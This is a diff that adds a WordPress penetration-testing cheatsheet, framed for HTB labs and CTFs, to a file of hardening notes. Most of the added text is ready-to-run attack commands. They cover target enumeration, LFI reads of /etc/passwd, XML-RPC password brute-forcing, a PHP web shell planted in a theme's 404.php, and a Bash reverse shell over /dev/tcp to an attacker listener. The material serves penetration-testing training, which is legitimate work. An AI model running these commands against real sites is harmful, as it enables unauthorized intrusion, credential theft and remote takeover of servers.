@@ -890,3 +890,139 @@ Modifying default configurations mitigates automated scanning and exploitation f
 * **Prevent User Enumeration:** Deploy mechanisms (via custom code or plugins) to block author enumeration scans, thereby neutralizing a critical reconnaissance step used in password spraying attacks.
 * **Rate Limiting:** Implement strict login attempt limits to thwart brute-force and dictionary attacks.
 * **Obfuscate Authentication Portals:** Rename the default `wp-login.php` portal or restrict its access at the server level (e.g., using `.htaccess` or Nginx access controls) to authorized IP addresses only.
+
+# WordPress Hacking & Pentesting Cheatsheet
+
+A comprehensive operational guide and procedural roadmap detailing authorized penetration testing workflows for WordPress environments. This reference outlines the complete methodology from initial reconnaissance and aggressive enumeration to vulnerability research, exploitation, and post-exploitation, specifically tailored for HTB labs and CTF environments.
+
+## 1. Practical Assessment Roadmap
+
+### Assessment Flow
+`Target Reconnaissance` → `Virtual Host Discovery` → `WordPress Fingerprinting` → `Directory & Component Enumeration` → `Vulnerability Research (CVE/SearchSploit)` → `Exploitation (LFI/Download/XML-RPC)` → `Authenticated Access` → `Theme Editor RCE` → `System Enumeration & Evidence Retrieval`
+
+### Execution Phases
+- **Phase 1: Target Recon** - Execute Nmap scans to identify open web ports (80/443), web server software, and service versions.
+- **Phase 2: Virtual Host Discovery** - Inspect HTTP responses for domain names and append them to `/etc/hosts` for proper DNS resolution.
+- **Phase 3: WP Fingerprinting** - Parse HTML source code (`generator` meta tags, `?ver=` parameters) to identify WordPress core versions and active themes.
+- **Phase 4: Directory Enumeration** - Utilize FFUF to brute-force hidden paths, applying size filters (`-fs`) to eliminate soft-404 false positives.
+- **Phase 5: Directory Listing** - Check standard directories (e.g., `/wp-content/uploads/`) for misconfigured Apache "Index of" exposures.
+- **Phase 6: User Enumeration** - Leverage WPScan or author ID iteration (`/?author=1`) to harvest valid display names and privileged accounts.
+- **Phase 7: Plugin Enumeration** - Extract plugin paths from source code and query their `readme.txt` files to parse exact version numbers.
+- **Phase 8: Vulnerability Research** - Cross-reference identified components and versions using `searchsploit` to locate viable PoCs (Proof of Concepts). Do not assume outdated means exploitable; verify affected ranges.
+- **Phase 9: Unauthenticated File Download** - Exploit vulnerable plugin endpoints to download sensitive server files without valid credentials.
+- **Phase 10: Local File Inclusion (LFI)** - Inject payload paths (e.g., `/etc/passwd`) into vulnerable parameters to read unauthorized local system files.
+- **Phase 11: XML-RPC Validation** - Ping `xmlrpc.php` to verify availability (expecting a `405 Method Not Allowed / Allow: POST` response) and test authentication via `wp.getUsersBlogs`.
+- **Phase 12: Password Fuzzing** - Determine the baseline byte size of an invalid XML-RPC login attempt, then fuzz the password field using FFUF filtering out the invalid response size.
+- **Phase 13: Authenticated Access** - Access the `/wp-admin/` dashboard utilizing compromised credentials to assess granted privileges.
+- **Phase 14: Theme Editor RCE** - Inject a minimal PHP web shell into an inactive theme's `404.php` file via the Appearance editor to bypass active theme safety checks.
+- **Phase 15: RCE Validation** - Trigger the modified `404.php` endpoint via cURL, executing commands like `id` and `whoami` to confirm `www-data` context execution.
+- **Phase 16: Host Enumeration** - Leverage the web shell to list directories (`ls -la /home`), escalate privileges, or read required final evidence flags without necessarily dropping a full reverse shell.
+
+## 2. Nmap - Initial Reconnaissance
+
+- `nmap -Pn -sC -sV -p 80,443 <TARGET_IP>` - Executes a targeted port scan assuming the host is alive (`-Pn`), utilizing default NSE scripts (`-sC`) and service version detection (`-sV`).
+- `nmap -Pn -p- <TARGET_IP>` - Performs an exhaustive scan across all 65,535 TCP ports to discover non-standard services.
+- `sudo nmap -sS <TARGET_IP>` - Initiates a stealthy SYN "Half-open" scan, requiring root privileges.
+- `nmap -sT <TARGET_IP>` - Performs a standard TCP Connect scan, completing the full three-way handshake (louder, no root required).
+- `nmap --top-ports 100 <TARGET_IP>` - Scans the 100 most common TCP ports for rapid reconnaissance.
+
+## 3. cURL - HTTP Enumeration & Requests
+
+- `curl -sIL http://<HOST>/` - Performs a silent (`-s`) HTTP request, fetching only headers (`-I`) and automatically following redirects (`-L`).
+- `curl -k https://<HOST>/` - Bypasses TLS/SSL certificate validation for endpoints with self-signed or invalid certificates.
+- `curl -H "Host: blog.example.local" http://<TARGET_IP>/` - Injects a custom Host header to bypass proxy routing or test virtual host configurations without modifying local DNS.
+- `curl --resolve blog.example.local:80:<TARGET_IP> http://blog.example.local/` - Forces cURL to resolve a specific hostname to a target IP, bypassing system DNS.
+- `curl -d "username=user&password=pass" http://<HOST>/` - Transmits a standard HTTP POST request with URL-encoded form data.
+- `curl -s -o /dev/null -w "%{http_code}\n" http://<HOST>/resource` - Suppresses standard output and returns only the HTTP status code of the endpoint.
+- `curl -sG --data-urlencode "cmd=id" "http://<HOST>/shell.php"` - Submits a GET request (`-G`) while automatically URL-encoding the payload parameters.
+
+## 4. Linux DNS Mapping
+
+- `echo "<TARGET_IP> blog.example.local" | sudo tee -a /etc/hosts` - Appends a local DNS mapping to the `/etc/hosts` file for virtual host resolution.
+- `getent hosts blog.example.local` - Verifies that the system correctly resolves the newly added hostname.
+- `sudo sed -i '/blog\.example\.local/d' /etc/hosts` - Programmatically removes the old DNS entry to prevent routing conflicts when IP assignments change.
+
+## 5. WordPress Footprinting & Detection
+
+- `curl -s http://<HOST>/ | grep -Ei 'wp-content|wp-includes|wordpress'` - Parses the landing page source code to confirm the presence of WordPress architecture.
+- `curl -s http://<HOST>/ | grep -i 'meta name="generator"'` - Extracts the generator meta tag, which often leaks the exact WordPress core version.
+- `curl -s http://<HOST>/readme.html` - Accesses the default WordPress installation readme file, which may disclose versioning information.
+
+## 6. Theme & Plugin Enumeration
+
+- `curl -s http://<HOST>/ | grep -oE 'wp-content/themes/[^/"?]+/' | sort -u` - Extracts and deduplicates active theme directory paths from the HTML source.
+- `curl -s http://<HOST>/wp-content/themes/<THEME>/style.css | head -n 40` - Retrieves the theme's CSS stylesheet headers to extract versioning and author metadata.
+- `curl -s http://<HOST>/ | grep -oE 'wp-content/plugins/[^/"?]+/' | sort -u` - Extracts and deduplicates installed plugin paths from the HTML source.
+- `curl -s http://<HOST>/wp-content/plugins/<PLUGIN>/readme.txt | grep -Ei '^(Stable tag|Version|Requires at least|Tested up to):'` - Parses the plugin's `readme.txt` to identify exact versions, crucial for mapping to known CVEs.
+
+## 7. Directory Fuzzing & Listing
+
+- `ffuf -u http://<HOST>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc 200,204,301,302,307,401,403` - Executes directory brute-forcing, explicitly defining which HTTP status codes indicate a valid match.
+- `ffuf -u http://<HOST>/FUZZ -w <WORDLIST> -fs <FALSE_RESPONSE_SIZE>` - Filters out soft-404 responses by instructing FFUF to ignore results matching a specific byte size.
+- `curl -s http://<HOST>/<DIRECTORY>/ | grep -i "Index of"` - Detects misconfigured Apache web servers allowing unauthorized directory traversal and file listing.
+- `curl -s http://<HOST>/<DIRECTORY>/ | html2text` - Renders directory listing HTML output into clean, terminal-readable plain text.
+
+## 8. User Enumeration
+
+- `curl -sI "http://<HOST>/?author=1"` - Leverages the default WordPress author routing behavior to leak usernames via HTTP `Location` headers.
+- `curl -s http://<HOST>/wp-json/wp/v2/users | jq` - Queries the exposed WordPress REST API for user endpoints, formatting the JSON output for readability.
+
+## 9. WPScan Usage
+
+- `wpscan --url http://<HOST> --enumerate u` - Enumerates WordPress users to identify valid account names for brute-force or targeted attacks.
+- `wpscan --url http://<HOST> --enumerate ap --plugins-detection aggressive` - Actively probes for all plugins, bypassing passive detection methods to uncover hidden components.
+- `wpscan --url http://<HOST> --enumerate vt` - Specifically enumerates the target for known vulnerable themes.
+
+## 10. Exploit Research (SearchSploit)
+
+- `searchsploit "WordPress <PLUGIN> <VERSION>"` - Queries the local Exploit-DB repository for specific component vulnerabilities.
+- `searchsploit -x php/webapps/<EXPLOIT>.txt` - Opens the selected exploit Proof of Concept (PoC) in the terminal pager for code review.
+- `searchsploit "WordPress <PLUGIN>" | grep -Ei 'LFI|local file|file download|arbitrary file|file read|traversal|SQL|RCE'` - Filters SearchSploit output to isolate high-impact vulnerabilities.
+
+## 11. Local File Inclusion (LFI) & File Download
+
+- `curl -s "http://<HOST>/<VULNERABLE_ENDPOINT>?<PARAMETER>=/etc/passwd" | grep '^f'` - Exploits an LFI vulnerability to read the `/etc/passwd` file, filtering the output to display valid local user accounts.
+- `curl -s "http://<HOST>/wp-admin/admin.php?page=download_report&report=users&status=all"` - Example pattern of exploiting an unauthenticated file download vulnerability to exfiltrate sensitive backend reports.
+
+## 12. XML-RPC Enumeration & Attack
+
+- `curl -i http://<HOST>/xmlrpc.php` - Checks the availability of the XML-RPC interface. A `405 Method Not Allowed` implies the endpoint is active and awaiting POST requests.
+- `wpscan --url http://<HOST> -U <USER> -P <WORDLIST> --password-attack xmlrpc -t 50` - Executes a multithreaded credential brute-force attack leveraging the XML-RPC API.
+- `ffuf -u http://<HOST>/xmlrpc.php -w /tmp/rockyou.txt -X POST -H "Content-Type: text/xml" -d '<XML_PAYLOAD>' -fs <INVALID_SIZE>` - Uses FFUF to brute-force the XML-RPC endpoint by injecting payloads directly into the POST body and filtering out standard rejection responses.
+
+## 13. Theme Editor RCE & Web Shells
+
+- `curl -s "http://<HOST>/wp-content/themes/<INACTIVE_THEME>/404.php?cmd=whoami"` - Triggers a manually injected PHP web shell located within an inactive theme, achieving Remote Code Execution (RCE) without disrupting the live site architecture.
+- `curl -sG --data-urlencode "cmd=ls -la /home" "http://<HOST>/wp-content/themes/<INACTIVE_THEME>/404.php"` - Enumerates the underlying file system dynamically passing OS commands through the web shell.
+
+## 14. Reverse Shell & Post-Exploitation
+
+- `nc -lvnp 4444` - Initializes a Netcat listener on the attacker machine to catch inbound reverse shell connections without DNS resolution (`-n`).
+- `curl -sG --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'" "http://<HOST>/wp-content/themes/<THEME>/404.php"` - Executes a Bash reverse shell payload via the web shell, tunneling standard output and errors back to the listening attacker machine.
+- `ss -tulpn` - Post-exploitation command to audit listening ports and active socket connections on the compromised host.
+- `ip a` - Post-exploitation command to map internal network interfaces and routing configurations.
+
+## 15. Quick References
+
+### HTTP Status Codes
+- `200` - OK (Request successful)
+- `301 / 302` - Permanent / Temporary Redirect
+- `401 / 403` - Authentication Required / Forbidden (Access denied)
+- `404 / 405` - Not Found / Method Not Allowed
+- `500` - Internal Server Error
+
+### Essential CLI Filters
+- `grep -Ei 'wordpress|plugin|theme'` - Case-insensitive extended regular expression search.
+- `grep '^f'` - Matches only lines beginning with the character 'f'.
+- `sort -u` - Sorts output alphabetically and purges duplicate entries.
+- `jq` - Parses and formats JSON structured data.
+- `html2text` - Renders HTML web layouts into readable CLI text format.
+
+### Target Terminology
+- **Directory Fuzzing:** Automated discovery of unlinked routes and hidden paths.
+- **Directory Listing:** Server misconfiguration exposing the contents of a directory.
+- **LFI (Local File Inclusion):** Vulnerability allowing attackers to read local server files.
+- **Unauthenticated File Download:** Bypassing access controls to retrieve protected files.
+- **RCE (Remote Code Execution):** Ability to execute arbitrary operating-system level commands.
+- **Web Shell:** A malicious script uploaded to maintain persistent HTTP-based command execution.
+- **Reverse Shell:** A shell session initiated from the target system connecting back to the attacker's infrastructure.
